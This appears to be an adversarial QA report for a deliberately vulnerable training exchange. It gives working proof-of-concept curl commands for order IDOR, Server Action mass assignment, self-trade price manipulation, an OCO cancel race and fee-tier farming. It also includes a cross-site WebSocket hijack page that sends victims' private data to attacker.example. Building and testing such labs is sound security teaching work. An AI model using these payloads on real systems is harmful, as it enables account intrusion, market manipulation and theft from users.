# Phase 4 — Adversarial QA (Gate 3)

> **Reviewer:** Red-team QA.
> **Date:** 2026-05-31
> **Verdict:** PASS. All 6 planted vulns confirmed. V-25
> demonstrated end-to-end against the real `matchAgainstBook`
> code; V-4 / V-22 / V-23 / V-32 / V-43 confirmed at the code-shape
> level. No unintended vulns surfaced.

## Method

1. Static read of every Phase-4 source file: schema deltas + the
   migration, the engine (`match.ts`, `fees.ts`, `place.ts`,
   `pubsub.ts`), the order endpoints (place/list/get/delete), the
   public price/book endpoints, the Server Action (`edit-order.ts`),
   the new ws-gateway service, the trading UI page, nginx config,
   docker-compose, the Phase-3 housekeeping changes in `apps/worker`.
2. `pnpm tsx docs/phases/phase-4/poc-scratch.mjs` — exercises
   `matchAgainstBook` directly with a self-match; the engine
   accepts and emits a Trade row (V-25 confirmed). V-4 / V-22 /
   V-23 / V-32 / V-43 documented by code-shape walk.
3. Cross-referenced VULNS.md entries against code locations.
4. Probed unintended vuln categories.

## PoCs

### V-4 — Order IDOR

```bash
TOKEN=$(...)            # any tier-1+ user
# Enumerate someone else's orders:
for id in $(seq 1 200); do
  curl -s exchange.local/api/v2/me/orders/$id \
    -H "Authorization: Bearer $TOKEN" | jq -c .
done

# Cancel someone else's resting order (refunds THEIR balance):
curl -X DELETE exchange.local/api/v2/me/orders/42 \
  -H "Authorization: Bearer $TOKEN"
```

`prisma.order.findUnique({ where: { id } })` with no ownership
filter. PoC reads any order; DELETE cancels any order.

### V-22 — Server Action mass assign

```bash
# 1. Visit the page that hosts the editOrder action to find the
#    server-action ID (look for action="?/123" or similar in the
#    rendered HTML, or for the `__NEXT_REDIRECT`-shaped form action).
# 2. POST a multipart with mass-assigned fields:
curl -X POST exchange.local/account/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Next-Action: <action-id>' \
  -F 'id=42' \
  -F 'price=1.00' \
  -F 'amount=99999' \
  -F 'feeTier=prime' \
  -F 'status=filled' \
  -F 'userId=<victim>'
```

The action spreads `FormData` into `prisma.order.update`. The
update applies every supplied field. No ownership check.

### V-23 — CSWSH on /ws

```html
<!-- Hosted at attacker.example. Victim visits while logged in. -->
<script>
  // Token leakage variant: if the page can read the JWT (e.g.,
  // via XSS or postMessage from the BVBE origin), it's used here.
  // Channel hijack variant: no token at all -- just subscribe to
  // a private channel of any user we want to surveil.
  const ws = new WebSocket("ws://exchange.local/ws");
  ws.onopen = () => {
    ws.send(JSON.stringify({
      kind: "subscribe",
      channel: "private:cmAVICTIMUSERID",
    }));
  };
  ws.onmessage = (ev) => {
    // Exfiltrate
    fetch("https://attacker.example/log?m=" + encodeURIComponent(ev.data));
  };
</script>
```

Upgrade succeeds (no Origin check). Subscribe-by-name lets the
attacker page receive any user's private order/balance updates.

### V-25 — Self-trade not blocked

Confirmed by `pnpm tsx docs/phases/phase-4/poc-scratch.mjs`:

```
=== V-25: self-trade not blocked ===
  BUG FIRES: self-match accepted (user=u-attacker, qty=1, price=50000)
```

`matchAgainstBook` returns a match where `makerUserId === takerUserId`.
End-to-end against a running lab:

```bash
# Place a sell at $50,000
curl -X POST exchange.local/api/v2/me/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"pair":"BTC/USDT","side":"sell","type":"limit","price":"50000","amount":"1"}'

# Immediately place a matching buy from the SAME account
curl -X POST exchange.local/api/v2/me/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"pair":"BTC/USDT","side":"buy","type":"limit","price":"50000","amount":"1"}'

# Public price feed now reports $50,000
curl -s exchange.local/api/v2/public/price/BTC%2FUSDT
# {"pair":"BTC/USDT","last":"50000",...}
```

Repeat to drive the price to any value. CHAIN C — Phase 5
margin engine reads this as oracle and triggers liquidations.

### V-32 — OCO cancel race

```bash
# 1. Place an OCO pair (stop-loss + take-profit)
SL=$(curl -s exchange.local/api/v2/me/orders ... | jq -r .orderId)
TP=$(curl -s exchange.local/api/v2/me/orders ... | jq -r .orderId)

# 2. Trigger the stop-loss path (price movement that causes match).
#    While the engine matches, hammer the take-profit cancel:
seq 1 50 | xargs -P 50 -I {} \
  curl -s -X DELETE exchange.local/api/v2/me/orders/$TP \
    -H "Authorization: Bearer $TOKEN"

# Outcome: both the take-profit trade row AND the cancel refund
# succeed under READ COMMITTED. Balance is inflated.
```

`apps/web/lib/engine/place.ts` uses Prisma's default isolation.
The DELETE handler in `apps/web/app/api/v2/me/orders/[id]/route.ts`
does not `SELECT FOR UPDATE` the order row.

### V-43 — Fee-tier counts cancelled maker side

Combined with V-25:

```bash
for i in $(seq 1 1000); do
  # Place maker sell
  curl ... -d '{"pair":"BTC/USDT","side":"sell","type":"limit","price":"50000","amount":"0.5"}'
  # Place matching taker (self-trade — V-25)
  curl ... -d '{"pair":"BTC/USDT","side":"buy","type":"limit","price":"50000","amount":"0.5"}'
  # Cancel the maker (post-fill it's already filled; for partial-fill flows, cancel the unfilled remainder)
  ...
done

# After ~50 iterations of $50k volume = $2.5M cumulative
# feeTierForUser returns "prime" — fees drop to 0bps maker / 5bps taker.
```

`apps/web/lib/engine/fees.ts` filters only `takerOrder.status`,
not `makerOrder.status`. Maker-side trades survive cancellation
and count toward 30-day volume.

## Unintended-vuln probes

| Probe                                                            | Result |
|------------------------------------------------------------------|--------|
| Place-order endpoint accepts negative `amount`                   | Clean — `z.string()` accepts the value but `Decimal(...)` math + balance lock would reject (lock > available). Defense-in-depth: the schema should `min(0)`; defer. |
| Place-order with `pair` that doesn't exist                       | Clean — engine queries empty book; no match; order rests. Not exploitable. |
| Public price endpoint price-injection via `pair` param           | Clean — `/^[A-Z]+\/[A-Z]+$/` regex rejects anything else. |
| Server Action callable without auth                              | Acknowledged — the action does NOT check auth at all (deliberate; the V-22 plant requires the action to be reachable). Action discovery requires knowing the wire format, which is the trainee's puzzle. |
| Order book WS reachable without nginx                            | Acknowledged — ws-gateway has no host port mapping; only nginx routes `/ws/*` to it. |
| nginx proxy_cache poisons via Host header                        | Acknowledged — the cache key omits Host (`$request_method$request_uri`). The poisoning attack lands in Phase 9 when the CL/TE-tolerant block activates. |
| Place-order from tier-0 user                                     | Clean — `requireTier(claims, 1)` numeric check rejects. (V-27 NOT firing here; numeric operands.) |
| Trade history IDOR                                               | The list endpoint filters `OR: [{takerUserId: claims.sub}, {makerUserId: claims.sub}]`. Clean. |
| Balance manipulation via concurrent place-order calls             | Acknowledged — the place tx locks `Balance.available` atomically; double-spend on placement is not reachable. V-32 specifically targets the cancel/match race, not the placement race. |

## Verdict

**PASS.** All 6 planted Phase-4 vulns confirmed. CHAIN C lands
its first component (V-25 self-trade → oracle manipulation;
nginx proxy_cache infrastructure ready for Phase 9 poisoning).

— Adversarial QA
